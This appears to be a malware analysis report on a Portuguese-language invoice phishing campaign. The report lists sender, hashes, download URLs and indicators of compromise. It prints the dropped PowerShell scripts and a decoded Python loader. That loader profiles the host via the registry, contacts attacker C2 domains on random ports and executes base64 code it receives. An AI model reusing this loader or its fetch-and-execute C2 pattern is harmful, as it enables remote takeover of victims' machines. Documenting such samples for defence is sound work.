THREAT IDENTIFICATION:  POSSIBLE DBATLOADER (aka MODILOADER)

SUBJECTS OBSERVED
n-81498442-88778637721.82762910866

SENDERS OBSERVED
Sophia da Rocha <sophiadarocha469702@outlook.com>

HTML ATTACHMENT FILE HASH
nota-gerada-81498442-88778637721.html
567345c07a1742503d4aa89484ababc1

SOURCE CODE OF THE HTML ATTACHMENT
<span hidden=3D'hidden' style=3D"background:moccasin">81498442-88778637721.8276291086694202770281498442-88778637721.82762910866</span>
<td align=3D"left" class=3D"esd-block-text h-auto" height=3D"296">
    <p style=3D"font-size: 14px; line-height: 100%;"><br></p>
    <p style=3D"font-size: 15px; font-family: roboto, 'helvetica neue', helvetica, arial, sans-serif; line-height: 100%;">Segue a <span style=3D"font-size: 14px; line-height: 100%;"><strong>n-00000081498442-88778637721.827629108660000094202770200</strong></span> emitida</p>
    <p style=3D"font-size: 15px; font-family: roboto, 'helvetica neue', helvetica, arial, sans-serif; line-height: 100%;">e encaminhada via email.</p>
    <p style=3D"font-size: 15px; line-height: 100%;"><br></p>
    <p style=3D"font-size: 15px; line-height: 100%;"><br></p>
    <p style=3D"font-size: 15px; font-family: roboto, 'helvetica neue', helvetica, arial, sans-serif; line-height: 100%;">n : <a target=3D"_blank" href=3D"https://dpsols7.autodesk360.com/shares/download/file/SHd38bfQT1fb47330c99c55d44aacebd2ec7/dXJuOmFkc2sud2lwcHJvZDpmcy5maWxlOnZmLjhZc1hBS2Q2VHNDa0Z1NkZ0Q2tQdHc_dmVyc2lvbj00?b44bb61abebf41d695a4580f072d9b74">n-00000081498442-8877863772=
1.827629108660000094202770200</a> (290.8&nbsp;&nbsp;kb)</p>
    <p style=3D"line-height: 100%;"><br></p>
</td>

ZIP FILE DOWNLOAD URLS
https://dpsols7.autodesk360.com/shares/download/file/SHd38bfQT1fb47330c99c55d44aacebd2ec7/dXJuOmFkc2sud2lwcHJvZDpmcy5maWxlOnZmLjhZc1hBS2Q2VHNDa0Z1NkZ0Q2tQdHc_dmVyc2lvbj00?b44bb61abebf41d695a4580f072d9b74

https://cdn.us.oss.api.autodesk.com/com.autodesk.oss-persistent/us-east-1/8b/db/8c/c5bb09f81d9870e89448e103ac38e0bc06/wip.dm.prod?response-content-type=application%2Fzip&response-content-disposition=attachment%3B+filename%3D%22Nota+004953984933321.zip%22%3B+filename*%3Dutf-8%27%27Nota%2520004953984933321.zip&Expires=1701188932&Signature=WdWl-1r597hpEyWV~2xs3gTbffdT709gl84gxd-F1sd5sCdmACVkhi4-VXPXfH0u1tvlKk-CvDMWOkARC-9AcjaTo0Avtubb7ygoTFjHI5~WAK5S23z47Qtqht28MvhZvj3nnixJZ-TGhxTeZX4IXjY-4pGLggW~qiAPrhBKa9i7ZQljQh5RO833DOw~kdG5kOm4yS4I2BNMyO-xvpNdh265lTvxFzHcXLOJqKTNG3MfejNncHG8j0jw~yNSQhmKGr49mX4hf3fJom~wjQvAaDKq~NQ11xfEFelEE3VRLW29yXLyu3fmSWv354bFNVoW8uh4wZjo0BAC4FUZa9v8iw__&Key-Pair-Id=K5HRZD7MMO1U9

ZIP FILE HASH
Nota 004953984933321.zip
c65d2c112b370bbefd84b815de7089d3

MSI FILE HASH
nf.msi
f0d800926aee7c9237fe039dcea03f50

FIRST CAPTURED POWERSHELL COMMAND
 -NoProfile -Noninteractive -ExecutionPolicy Bypass -File "C:\Users\analyst\AppData\Local\Temp\pssDF44.ps1" 

POWERSHELL SCRIPT FILE HASHES
pssDF44.ps1
f338d54998e15d39d4851b9fd330a91c

pssDF43.ps1
348cbb0dbd43cc98617d374e040a2570

CONTENTS OF pssDF44.ps1
try {                             
      $_msiPropOutFile = 'C:\Users\analyst\AppData\Local\Temp\msiDF42.txt'             
                                     $_isTest = $false                            
Function AI_GetMsiProperty([string] $name = $(throw 'AI_GetMsiProperty requires property name'), 
                              $testValue = $null)                                                   
{                                                                              
  if ($_isTest -and ($testValue -ne $null))                                    
  {                                                                            
   "_testValue.$name :<->: $testValue" >> $_msiPropOutFile; 
   return $testValue                                                           
  }                                                                            
  [array] $content = Get-Content $_msiPropOutFile                              
  [array]::Reverse($content)                                                   
  ForEach ($line in $content)                                                  
  {                                                                            
    $lineTokens = $line -split ' :<->: '                          
    if ($lineTokens.Count -gt 1 -and $lineTokens[0] -eq $name)                 
    {                                                                          
      return $lineTokens[1]                                                    
    }                                                                          
  }                                                                            
  return ''                                                                    
}                                                                              
                                                                               
Function AI_SetMsiProperty($name = $(throw 'AI_SetMsiProperty requires 2 arguments'), 
                              $value = $(throw 'AI_SetMsiProperty requires 2 arguments'))
{                                                                              
  "$name :<->: $value" >> $_msiPropOutFile;                     
}                               
      &'C:\Users\analyst\AppData\Local\Temp\pssDF43.ps1'     
      if ($LastExitCode -ne $null) {                             
        exit $LastExitCode;                                      
      }                                                          
    }                                                            
    catch {                                                      
       Write-Output "ERROR: $($_.Exception.Message)"           
       Exit 0x23E #ERROR_UNHANDLED_EXCEPTION                     
    }

The text file referenced at the top does exist in the /temp folder but it's 0-bytes

DECODED BASE64 BLOB FROM pssDF43.ps1 POWERSHELL SCRIPT
# Block for declaring the script parameters.
Param()

cd $ENV:public
$Folder = "${ENV:public}\pefile-2023.2.7"
$Folder2 = "${ENV:public}\python"
if (!(Test-Path -Path $Folder2 -PathType Container)) {
    Invoke-WebRequest -URI https://files.pythonhosted.org/packages/78/c5/3b3c62223f72e2360737fd2a57c30e5b2adecd85e70276879609a7403334/pefile-2023.2.7.tar.gz -OutFile pefile.tar.gz
    tar -xvzf pefile.tar.gz;
    Rename-Item $Folder "python"
    Invoke-WebRequest -URI https://www.python.org/ftp/python/3.9.6/python-3.9.6-embed-win32.zip -OutFile python.zip;
    Expand-Archive python.zip -DestinationPath python;
}
.\python\python.exe -c """import base64; exec(base64.b64decode('bSA9ICc5NjkxOTY5Nzk4NzMnCmZyb20gdGltZSBpbXBvcnQgc2xlZXAKc2xlZXAoNjApCmltcG9ydCBiYXNlNjQgYXMgYgppbXBvcnQgc29ja2V0IGFzIHNzCmZyb20gcmFuZG9tIGltcG9ydCBjaG9pY2UKaW1wb3J0IHdpbnJlZyBhcyB3CmRlZiBwKGMsIG4pOgogICAgczIgPSB3Lk9wZW5LZXkody5IS0VZX0xPQ0FMX01BQ0hJTkUsIGMpCiAgICByZXR1cm4gdy5RdWVyeVZhbHVlRXgoczIsIG4pWzBdCnByID0gcChyJ0hBUkRXQVJFXFxERVNDUklQVElPTlxcU3lzdGVtXFxDZW50cmFsUHJvY2Vzc29yXFwwJywgJ1Byb2Nlc3Nvck5hbWVTdHJpbmcnKQp2cyA9IHAocidTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvbicsICdQcm9kdWN0TmFtZScpCmZzID0gJy5icmF6aWxzb3V0aC5jbG91ZGFwcC5henVyZS5jb20nCmxsID0gW2Yna2Y0Zmo5Mnpma2o5Mntmc30nLCBmJ2Zrajk5M3lmMzkzM3tmc30nLCBmJ2dnNDk4amhoMng5NDM0e2ZzfScsIGYnaGg1ODM5MDA0amh7ZnN9JywgZidpYnMxMXhrZDg5NDN7ZnN9JywgZidza2ZqMjR1dTI5ZmRrajRrantmc30nXQplZSA9IEZhbHNlCndoaWxlIFRydWU6CiAgICBpZiAnQnJvYWR3ZWxsJyBpbiBwcjoKICAgICAgICBicmVhawogICAgZm9yIGwgaW4gbGw6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB3aXRoIHNzLnNvY2tldChzcy5BRl9JTkVULCBzcy5TT0NLX1NUUkVBTSkgYXMgczoKICAgICAgICAgICAgICAgIHMuY29ubmVjdCgoZid7bH0nLCBjaG9pY2UoWzM4MjEsIDQ0MTgsIDUxNzgsIDk5ODMsIDczMTEsIDgyOTQsIDYyNzMsIDIxMTksIDEwMTgsIDE3MDFdKSkpCiAgICAgICAgICAgICAgICBzLnNlbmQoZidweUNvZGUgLSB7c3MuZ2V0aG9zdG5hbWUoKX0gfCB7dnN9IHwge3ByfScuZW5jb2RlKCkpCiAgICAgICAgICAgICAgICBkdCA9IHMucmVjdig2NTUzNikuZGVjb2RlKCkKICAgICAgICAgICAgICAgIGV4ZWMoYi5iNjRkZWNvZGUoc3RyKGR0KSkpCiAgICAgICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgICAgIGVlID0gVHJ1ZQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgIGxsLmFwcGVuZCgnY2FtZXJhLWVtcHJlc2EuYWNjZXNzY2FtLm9yZycpCiAgICBpZiBlZToKICAgICAgICBicmVhaw==')); exit()""";

DECODED BASE64 BLOB FROM THE ABOVE PYTHON SCRIPT
m = '969196979873'
from time import sleep
sleep(60)
import base64 as b
import socket as ss
from random import choice
import winreg as w
def p(c, n):
    s2 = w.OpenKey(w.HKEY_LOCAL_MACHINE, c)
    return w.QueryValueEx(s2, n)[0]
pr = p(r'HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0', 'ProcessorNameString')
vs = p(r'SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion', 'ProductName')
fs = '.brazilsouth.cloudapp.azure.com'
ll = [f'kf4fj92zfkj92{fs}', f'fkj993yf3933{fs}', f'gg498jhh2x9434{fs}', f'hh5839004jh{fs}', f'ibs11xkd8943{fs}', f'skfj24uu29fdkj4kj{fs}']
ee = False
while True:
    if 'Broadwell' in pr:
        break
    for l in ll:
        try:
            with ss.socket(ss.AF_INET, ss.SOCK_STREAM) as s:
                s.connect((f'{l}', choice([3821, 4418, 5178, 9983, 7311, 8294, 6273, 2119, 1018, 1701])))
                s.send(f'pyCode - {ss.gethostname()} | {vs} | {pr}'.encode())
                dt = s.recv(65536).decode()
                exec(b.b64decode(str(dt)))
                s.close()
                ee = True
                break
        except:
            pass
    ll.append('camera-empresa.accesscam.org')
    if ee:
        break

OBSERVED DNS QUERIES FOR:
kf4fj92zfkj92.brazilsouth.cloudapp.azure.com
(Returned: 20.226.157.205)

fkj993yf3933.brazilsouth.cloudapp.azure.com
gg498jhh2x9434.brazilsouth.cloudapp.azure.com
hh5839004jh.brazilsouth.cloudapp.azure.com
ibs11xkd8943.brazilsouth.cloudapp.azure.com
skfj24uu29fdkj4kj.brazilsouth.cloudapp.azure.com
(All returned: No such name)

LIKELY CAMPAIGN IDENTIFIER
"kf4fj92zfkj92"

LIKELY C2 / NEXT STAGE DOWNLOAD DOMAIN
camera-empresa.accesscam.org
20.206.228.177
(All traffic was TCP Retransmission packets)


